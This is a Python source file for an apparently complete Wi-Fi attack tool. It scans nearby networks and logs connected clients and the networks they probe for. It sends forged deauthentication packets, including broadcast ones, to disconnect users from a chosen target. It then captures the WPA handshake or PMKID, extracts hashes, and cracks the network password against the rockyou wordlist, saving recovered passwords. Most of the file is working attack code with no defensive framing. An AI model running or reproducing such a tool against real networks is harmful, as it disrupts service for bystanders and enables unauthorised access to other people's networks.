#!/usr/bin/env python3

from scapy.all import *
from rich.console import Console
from rich.prompt import Prompt
from rich.progress import Progress
import subprocess
import threading
import time
import os
import csv
from modules.utils import (
    get_interface,
    setup_monitor_mode,
    scan_networks,
    select_target,
    get_data_path,
    log_activity,
    get_temp_path,
    get_capture_path,
    cleanup_temp_files
)
from datetime import datetime
from rich.table import Table
from threading import Thread
import shutil

class HandshakeCapture:
    def __init__(self):
        self.console = Console()
        self.interface = None
        self.target_bssid = None
        self.target_channel = None
        self.target_essid = None
        self.capture_file = None
        self.running = False
        self.handshake_captured = False
        self.networks = []
        self.deauth_count = 5  # Number of deauth packets to send per client

    def check_dependencies(self):
        tools = ['airodump-ng', 'aireplay-ng', 'aircrack-ng', 'hcxpcapngtool', 'hcxdumptool']
        missing_tools = []
        
        for tool in tools:
            try:
                subprocess.run(['which', tool], capture_output=True, check=True)
            except subprocess.CalledProcessError:
                missing_tools.append(tool)
        
        if missing_tools:
            self.console.print(f"[red]Missing required tools: {', '.join(missing_tools)}[/red]")
            self.console.print("[yellow]Please install them using: sudo apt install aircrack-ng hcxtools hcxdumptool[/yellow]")
            return False
        return True

    def get_interface(self):
        result = subprocess.run(['iwconfig'], capture_output=True, text=True)
        interfaces = [line.split()[0] for line in result.stdout.split('\n') if 'IEEE 802.11' in line]
        
        if not interfaces:
            self.console.print("[red]No wireless interfaces found![/red]")
            return None
            
        self.console.print("[cyan]Available interfaces:[/cyan]")
        for idx, iface in enumerate(interfaces, 1):
            self.console.print(f"{idx}. {iface}")
            
        while True:
            try:
                choice = int(input("\nSelect interface number: ")) - 1
                if 0 <= choice < len(interfaces):
                    return interfaces[choice]
            except ValueError:
                pass
            self.console.print("[red]Invalid choice. Please try again.[/red]")

    def setup_monitor_mode(self):
        """Setup monitor mode on the selected interface"""
        try:
            if not self.interface:
                return None

            # Kill interfering processes
            subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # Check if interface is already in monitor mode
            if 'mon' in self.interface:
                return self.interface

            # Start monitor mode
            subprocess.run(['airmon-ng', 'start', self.interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)  # Wait for interface to be ready

            # Check the new interface name
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'Mode:Monitor' in line:
                    mon_interface = line.split()[0]
                    self.interface = mon_interface
                    return mon_interface

            # Fallback to traditional naming
            mon_interface = self.interface + 'mon'
            self.interface = mon_interface
            return mon_interface

        except Exception as e:
            self.console.print(f"[red]Error setting up monitor mode: {str(e)}[/red]")
            return None

    def scan_networks(self):
        """Scan for available networks"""
        try:
            # Create output directory if it doesn't exist
            os.makedirs('/tmp', exist_ok=True)
            temp_file = "/tmp/scan"
            
            # Start airodump-ng scan
            scan_cmd = [
                'airodump-ng',
                '--output-format', 'csv',
                '--write', temp_file,
                self.interface
            ]
            
            self.console.print("\n[yellow]Scanning for networks...[/yellow]")
            self.console.print("[cyan]This will take about 10 seconds...[/cyan]")
            
            # Run airodump-ng
            scan_process = subprocess.Popen(
                scan_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Let it run for 10 seconds
            time.sleep(10)
            scan_process.terminate()
            
            # Wait a moment for files to be written
            time.sleep(1)
            
            networks = []
            try:
                with open(f"{temp_file}-01.csv", 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                    
                    # Find the line that starts the client list
                    station_line = -1
                    for i, line in enumerate(lines):
                        if 'Station MAC' in line:
                            station_line = i
                            break
                    
                    # Process only AP lines (not client lines)
                    ap_lines = lines[1:station_line] if station_line != -1 else lines[1:]
                    
                    for line in ap_lines:
                        if line.strip() and ',' in line:
                            parts = line.strip().split(',')
                            if len(parts) >= 14:  # Ensure we have enough fields
                                essid = parts[13].strip()
                                # Only add networks with a valid ESSID
                                if essid and essid != "":
                                    networks.append({
                                        'BSSID': parts[0].strip(),
                                        'Channel': parts[3].strip(),
                                        'ESSID': essid
                                    })
                                    # Print immediate feedback
                                    self.console.print(f"[green]Found network:[/green] {essid} ({parts[0].strip()})")
            except FileNotFoundError:
                self.console.print("[red]Error: Scan output file not found.[/red]")
            finally:
                # Cleanup temporary files
                os.system(f"rm -f {temp_file}*")
            
            self.networks = networks
            return networks
            
        except Exception as e:
            self.console.print(f"[red]Error during scan: {str(e)}[/red]")
            return []

    def gather_network_info(self):
        """Gather comprehensive network information"""
        try:
            self.console.print("\n[yellow]Gathering detailed network information...[/yellow]")
            
            # Start airodump-ng to gather detailed info
            info_file = get_temp_path(f'info_{self.target_bssid.replace(":", "")}')
            
            info_cmd = [
                'airodump-ng',
                '--bssid', self.target_bssid,
                '--channel', self.target_channel,
                '--write', info_file,
                '--write-interval', '1',
                '--output-format', 'csv',
                self.interface
            ]
            
            process = subprocess.Popen(
                info_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Let it run for 15 seconds to gather more data
            time.sleep(15)
            process.terminate()
            
            network_info = {
                'ESSID': self.target_essid,
                'BSSID': self.target_bssid,
                'Channel': self.target_channel,
                'Encryption': 'Unknown',
                'Cipher': 'Unknown',
                'Authentication': 'Unknown',
                'Signal Strength': 'Unknown',
                'Connected Clients': [],
                'First Seen': 'Unknown',
                'Last Seen': 'Unknown',
                'Speed': 'Unknown',
                'Privacy': 'Unknown',
                'Beacons': 0,
                'Data Packets': 0,
                'Total Packets': 0,
                'Hidden': False,
                'WPS': False,
                'Client History': []
            }
            
            # Parse the CSV file for network details
            try:
                csv_file = f"{info_file}-01.csv"
                if os.path.exists(csv_file):
                    with open(csv_file, 'r', encoding='utf-8') as f:
                        lines = f.readlines()
                        
                        # Find AP info
                        for line in lines[2:]:  # Skip headers
                            if line.strip() and ',' in line:
                                parts = line.strip().split(',')
                                if len(parts) >= 15 and parts[0].strip() == self.target_bssid:
                                    network_info['Signal Strength'] = parts[8].strip() + ' dBm'
                                    network_info['First Seen'] = parts[1].strip()
                                    network_info['Last Seen'] = parts[2].strip()
                                    network_info['Speed'] = parts[4].strip() + ' MB/s'
                                    network_info['Privacy'] = parts[5].strip()
                                    network_info['Cipher'] = parts[6].strip()
                                    network_info['Authentication'] = parts[7].strip()
                                    network_info['Beacons'] = int(parts[9].strip() or 0)
                                    network_info['Data Packets'] = int(parts[10].strip() or 0)
                                    network_info['Total Packets'] = network_info['Beacons'] + network_info['Data Packets']
                                    network_info['WPS'] = 'WPS' in line
                                    network_info['Hidden'] = not bool(parts[13].strip())
                                    break
                        
                        # Find connected clients
                        station_line = -1
                        for i, line in enumerate(lines):
                            if 'Station MAC' in line:
                                station_line = i
                                break
                        
                        if station_line != -1:
                            for line in lines[station_line + 1:]:
                                if line.strip() and ',' in line:
                                    parts = line.strip().split(',')
                                    if len(parts) >= 6 and parts[5].strip() == self.target_bssid:
                                        client_info = {
                                            'MAC': parts[0].strip(),
                                            'Signal': parts[3].strip() + ' dBm',
                                            'Last Seen': parts[2].strip(),
                                            'First Seen': parts[1].strip(),
                                            'Power': parts[3].strip(),
                                            'Packets': parts[4].strip(),
                                            'Probed Networks': [x.strip() for x in parts[6:] if x.strip()]
                                        }
                                        network_info['Connected Clients'].append(client_info)
                                        network_info['Client History'].append(client_info['MAC'])
            
            except FileNotFoundError:
                self.console.print("[red]Could not find detailed network information file.[/red]")
            finally:
                # Cleanup
                cleanup_temp_files()
            
            # Get manufacturer info for BSSID and clients
            try:
                result = subprocess.run(['macchanger', '-l'], capture_output=True, text=True)
                mac_db = {}
                for line in result.stdout.split('\n'):
                    if line.strip():
                        parts = line.split()
                        if len(parts) >= 2:
                            prefix = parts[0].upper()
                            vendor = ' '.join(parts[1:])
                            mac_db[prefix] = vendor
                
                # Get BSSID manufacturer
                bssid_prefix = self.target_bssid[:8].upper()
                if bssid_prefix in mac_db:
                    network_info['Manufacturer'] = mac_db[bssid_prefix]
                
                # Get client manufacturers
                for client in network_info['Connected Clients']:
                    client_prefix = client['MAC'][:8].upper()
                    if client_prefix in mac_db:
                        client['Manufacturer'] = mac_db[client_prefix]
            except:
                pass

            # Additional network analysis
            network_info['Network Analysis'] = self.analyze_network(network_info)
            
            # Save and display the information
            info_file = get_data_path('handshakes', f'network_{self.target_bssid.replace(":", "")}_info.txt')
            with open(info_file, 'w') as f:
                f.write("=== Network Information ===\n")
                for key in ['ESSID', 'BSSID', 'Channel', 'Signal Strength', 'Speed', 'Privacy', 
                           'Cipher', 'Authentication', 'First Seen', 'Last Seen', 'Manufacturer',
                           'Beacons', 'Data Packets', 'Total Packets', 'WPS', 'Hidden']:
                    if key in network_info:
                        f.write(f"{key}: {network_info[key]}\n")
                
                f.write("\n=== Network Analysis ===\n")
                for finding in network_info['Network Analysis']:
                    f.write(f"- {finding}\n")
                
                f.write("\n=== Connected Clients ===\n")
                for idx, client in enumerate(network_info['Connected Clients'], 1):
                    f.write(f"\nClient {idx}:\n")
                    for key, value in client.items():
                        if key != 'Probed Networks':
                            f.write(f"{key}: {value}\n")
                    if client.get('Probed Networks'):
                        f.write("Probed Networks:\n")
                        for network in client['Probed Networks']:
                            f.write(f"  - {network}\n")
            
            # Display the information
            self.console.print("\n[green]=== Network Information ===[/green]")
            for key in ['ESSID', 'BSSID', 'Channel', 'Signal Strength', 'Speed', 'Privacy', 
                       'Cipher', 'Authentication', 'Manufacturer', 'WPS', 'Hidden']:
                if key in network_info:
                    self.console.print(f"[cyan]{key}:[/cyan] {network_info[key]}")
            
            self.console.print("\n[green]=== Network Analysis ===[/green]")
            for finding in network_info['Network Analysis']:
                self.console.print(f"[yellow]- {finding}[/yellow]")
            
            if network_info['Connected Clients']:
                self.console.print("\n[green]=== Connected Clients ===[/green]")
                for idx, client in enumerate(network_info['Connected Clients'], 1):
                    self.console.print(f"\n[yellow]Client {idx}:[/yellow]")
                    for key, value in client.items():
                        if key != 'Probed Networks':
                            self.console.print(f"[cyan]{key}:[/cyan] {value}")
                        elif value:
                            self.console.print("[cyan]Probed Networks:[/cyan]")
                            for network in value:
                                self.console.print(f"  - {network}")
            
            self.console.print(f"\n[yellow]Full network information saved to: {info_file}[/yellow]")
            return network_info
            
        except Exception as e:
            self.console.print(f"[red]Error gathering network information: {str(e)}[/red]")
            return None

    def analyze_network(self, network_info):
        """Analyze network information and provide insights"""
        findings = []
        
        # Check encryption and security
        if network_info['Privacy']:
            if 'WPA2' in network_info['Privacy']:
                findings.append("Network uses WPA2 encryption (Good security)")
            elif 'WPA' in network_info['Privacy']:
                findings.append("Network uses WPA encryption (Moderate security)")
            elif 'WEP' in network_info['Privacy']:
                findings.append("Network uses WEP encryption (Weak security - easily crackable)")
            else:
                findings.append("Network appears to be open (No encryption)")

        # Check WPS
        if network_info['WPS']:
            findings.append("WPS is enabled (Potential vulnerability)")

        # Check if hidden
        if network_info['Hidden']:
            findings.append("Network SSID is hidden (Security by obscurity)")

        # Analyze signal strength
        if 'Signal Strength' in network_info and network_info['Signal Strength'] != 'Unknown':
            strength = int(network_info['Signal Strength'].split()[0])
            if strength > -50:
                findings.append("Very strong signal strength (Excellent connection)")
            elif strength > -70:
                findings.append("Good signal strength")
            else:
                findings.append("Weak signal strength (May be far away)")

        # Analyze network activity
        if network_info['Data Packets'] > 1000:
            findings.append("High network activity detected")
        elif network_info['Data Packets'] < 100:
            findings.append("Low network activity detected")

        # Analyze connected clients
        client_count = len(network_info['Connected Clients'])
        if client_count > 0:
            findings.append(f"Active clients detected: {client_count}")
            
            # Check for client vulnerabilities
            probing_clients = sum(1 for client in network_info['Connected Clients'] 
                                if client.get('Probed Networks'))
            if probing_clients > 0:
                findings.append(f"Found {probing_clients} clients probing for other networks")

        return findings

    def send_deauth(self, client_mac):
        """Send deauth packets to a specific client"""
        # Create deauth packet
        deauth_packet = RadioTap() / Dot11(
            type=0,
            subtype=12,
            addr1=client_mac,
            addr2=self.target_bssid,
            addr3=self.target_bssid
        ) / Dot11Deauth(reason=7)

        # Send packets
        for _ in range(self.deauth_count):
            try:
                sendp(deauth_packet, iface=self.interface, verbose=False)
                time.sleep(0.1)  # Small delay between packets
            except Exception as e:
                self.console.print(f"[yellow]Error sending deauth packet: {str(e)}[/yellow]")

    def send_deauth_cycle(self, clients):
        """Send deauth packets for a 10-second cycle"""
        end_time = time.time() + 10  # 10 seconds of deauth

        with Progress() as progress:
            task = progress.add_task("[red]Sending deauth packets...", total=10)
            
            while time.time() < end_time and self.running and not self.handshake_captured:
                if clients:
                    for client in clients:
                        self.send_deauth(client)
                else:
                    self.send_deauth("FF:FF:FF:FF:FF:FF")
                    
                progress.update(task, advance=1)
                time.sleep(1)

    def listen_cycle(self):
        """Listen for handshakes for 1 minute"""
        end_time = time.time() + 60  # 1 minute of listening

        with Progress() as progress:
            task = progress.add_task("[cyan]Listening for handshakes...", total=60)
            
            while time.time() < end_time and self.running and not self.handshake_captured:
                # Check for handshake
                if os.path.exists(f"{self.capture_file}-01.cap"):
                    result = subprocess.run(
                        ['aircrack-ng', f"{self.capture_file}-01.cap"],
                        capture_output=True,
                        text=True
                    )
                    
                    if "1 handshake" in result.stdout:
                        self.handshake_captured = True
                        self.console.print("\n[green]✓ WPA handshake successfully captured![/green]")
                        return True
                
                progress.update(task, advance=1)
                time.sleep(1)
            
            return False

    def start_capture(self):
        """Main handshake capture process"""
        try:
            # Get wireless interface
            self.interface = get_interface()
            if not self.interface:
                return

            # Setup monitor mode
            self.console.print("\n[yellow]Enabling monitor mode...[/yellow]")
            self.interface = setup_monitor_mode(self.interface)
            if not self.interface:
                return

            # Scan for networks
            networks = scan_networks(self.interface)
            if not networks:
                return

            # Select target
            result = select_target(networks)
            if not result:
                return

            self.target_bssid, self.target_channel, self.target_essid, clients = result

            # Start capture process
            self.running = True
            self.capture_file = get_capture_path(f'handshake_{self.target_bssid.replace(":", "")}')

            # Start airodump-ng in background
            capture_cmd = [
                'airodump-ng',
                '--bssid', self.target_bssid,
                '--channel', self.target_channel,
                '--write', self.capture_file,
                '--output-format', 'pcap',
                self.interface
            ]
            
            capture_process = subprocess.Popen(
                capture_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            # Wait for airodump to start
            time.sleep(2)

            cycle_count = 1
            try:
                while self.running and not self.handshake_captured:
                    self.console.print(f"\n[cyan]Starting cycle {cycle_count}[/cyan]")
                    
                    # Deauth phase
                    self.send_deauth_cycle(clients)
                    
                    if self.handshake_captured:
                        break
                    
                    # Listening phase
                    if self.listen_cycle():
                        break
                    
                    cycle_count += 1

            except KeyboardInterrupt:
                self.running = False
                self.console.print("\n[yellow]Capture stopped by user[/yellow]")

            # Save results
            if self.handshake_captured:
                final_path = f"{self.capture_file}-01.cap"
                save_path = get_data_path('handshakes', f'handshake_{datetime.now().strftime("%Y%m%d_%H%M%S")}.cap')
                
                # Move capture file to handshakes directory
                if os.path.exists(final_path):
                    shutil.move(final_path, save_path)
                    self.console.print(f"\n[green]Handshake saved to: {save_path}[/green]")
                    log_activity(f"Handshake captured - Target: {self.target_essid or self.target_bssid}")
            else:
                self.console.print("\n[yellow]No handshake captured[/yellow]")

            # Cleanup
            capture_process.terminate()
            cleanup_temp_files()

        except Exception as e:
            self.console.print(f"[red]Error during handshake capture: {str(e)}[/red]")
        finally:
            self.running = False
            try:
                subprocess.run(['airmon-ng', 'stop', self.interface],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
            except:
                pass

    def extract_hash(self):
        """Extract hashes from the capture file"""
        try:
            self.console.print("\n[yellow]Attempting to extract hash from capture file...[/yellow]")
            
            # First try PMKID extraction
            hash_file = f"/tmp/hash_{self.target_bssid.replace(':', '')}.22000"
            
            # Try to extract PMKID/EAPOL hash
            extract_cmd = [
                'hcxpcapngtool',
                '-o', hash_file,
                f"{self.capture_file}-01.cap"
            ]
            
            result = subprocess.run(extract_cmd, capture_output=True, text=True)
            
            if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                self.console.print("[green]Successfully extracted hash![/green]")
                
                # Read and display the hash
                with open(hash_file, 'r') as f:
                    hash_content = f.read().strip()
                
                self.console.print("\n[cyan]Extracted Hash:[/cyan]")
                self.console.print(f"[yellow]{hash_content}[/yellow]")
                self.console.print(f"\n[green]Hash saved to: {hash_file}[/green]")
                
                # Save network info with the hash
                info_file = f"/tmp/network_{self.target_bssid.replace(':', '')}_info.txt"
                with open(info_file, 'w') as f:
                    f.write(f"Network: {self.target_essid}\n")
                    f.write(f"BSSID: {self.target_bssid}\n")
                    f.write(f"Channel: {self.target_channel}\n")
                    f.write(f"Hash File: {hash_file}\n")
                
                self.console.print(f"[yellow]Network info saved to: {info_file}[/yellow]")
                return True
            else:
                self.console.print("[red]No hash could be extracted from the capture file.[/red]")
                return False
                
        except Exception as e:
            self.console.print(f"[red]Error extracting hash: {str(e)}[/red]")
            return False

    def capture_pmkid(self):
        """Attempt to capture PMKID directly using hcxdumptool"""
        try:
            self.console.print("\n[yellow]Attempting PMKID capture...[/yellow]")
            
            # Create output file
            pmkid_file = f"/tmp/pmkid_{self.target_bssid.replace(':', '')}.pcapng"
            
            # Start PMKID capture
            pmkid_cmd = [
                'hcxdumptool',
                '-i', self.interface,
                '-o', pmkid_file,
                '--enable_status=1',
                '--filtermode=2',
                '--filterlist_ap=' + self.target_bssid
            ]
            
            self.console.print("[cyan]Starting PMKID capture (this will take about 20 seconds)...[/cyan]")
            
            process = subprocess.Popen(
                pmkid_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Let it run for 20 seconds
            time.sleep(20)
            process.terminate()
            
            # Convert the capture to hash format
            if os.path.exists(pmkid_file) and os.path.getsize(pmkid_file) > 0:
                hash_file = f"/tmp/pmkid_{self.target_bssid.replace(':', '')}.22000"
                
                convert_cmd = [
                    'hcxpcapngtool',
                    '-o', hash_file,
                    pmkid_file
                ]
                
                subprocess.run(convert_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                    self.console.print("[green]Successfully captured PMKID![/green]")
                    
                    # Read and display the hash
                    with open(hash_file, 'r') as f:
                        hash_content = f.read().strip()
                    
                    self.console.print("\n[cyan]Captured PMKID Hash:[/cyan]")
                    self.console.print(f"[yellow]{hash_content}[/yellow]")
                    self.console.print(f"\n[green]Hash saved to: {hash_file}[/green]")
                    return True
            
            self.console.print("[red]Failed to capture PMKID.[/red]")
            return False
            
        except Exception as e:
            self.console.print(f"[red]Error during PMKID capture: {str(e)}[/red]")
            return False
        finally:
            try:
                process.kill()
            except:
                pass 

    def crack_cap_file(self):
        """Directly crack the captured handshake file"""
        try:
            self.console.print("\n[yellow]Attempting to crack the captured handshake...[/yellow]")
            
            # Use proper data paths for output files
            password_file = get_data_path('passwords', f'password_{self.target_bssid.replace(":", "")}.txt')
            result_file = get_data_path('passwords', f'cracked_{self.target_bssid.replace(":", "")}.txt')
            
            # Use aircrack-ng to crack the handshake
            crack_cmd = [
                'aircrack-ng',
                '-w', '/usr/share/wordlists/rockyou.txt',  # Default wordlist
                '-l', password_file,  # Output file for password
                '-b', self.target_bssid,  # Target BSSID
                f"{self.capture_file}-01.cap"  # Capture file
            ]
            
            self.console.print("[cyan]Starting password cracking...[/cyan]")
            
            process = subprocess.Popen(
                crack_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            # Monitor the output
            password_found = False
            current_key = ""
            
            while True:
                line = process.stdout.readline()
                if not line and process.poll() is not None:
                    break
                
                # Show progress
                if "Tested" in line:
                    self.console.print(f"[yellow]{line.strip()}[/yellow]", end='\r')
                
                # Check for found password
                if "KEY FOUND!" in line:
                    password_found = True
                elif password_found and ")" in line and "(" in line:
                    current_key = line.split("(")[1].split(")")[0].strip()
                    break
            
            if password_found and current_key:
                self.console.print("\n[green]Password successfully cracked![/green]")
                self.console.print(f"[cyan]Network: {self.target_essid}[/cyan]")
                self.console.print(f"[cyan]Password: {current_key}[/cyan]")
                
                # Save the results
                with open(result_file, 'w') as f:
                    f.write(f"Network: {self.target_essid}\n")
                    f.write(f"BSSID: {self.target_bssid}\n")
                    f.write(f"Password: {current_key}\n")
                    f.write(f"Date Cracked: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                
                self.console.print(f"[yellow]Results saved to: {result_file}[/yellow]")
                return True
            else:
                self.console.print("\n[red]Password not found in default wordlist.[/red]")
                return False
                
        except Exception as e:
            self.console.print(f"[red]Error during password cracking: {str(e)}[/red]")
            return False
        finally:
            try:
                process.kill()
            except:
                pass 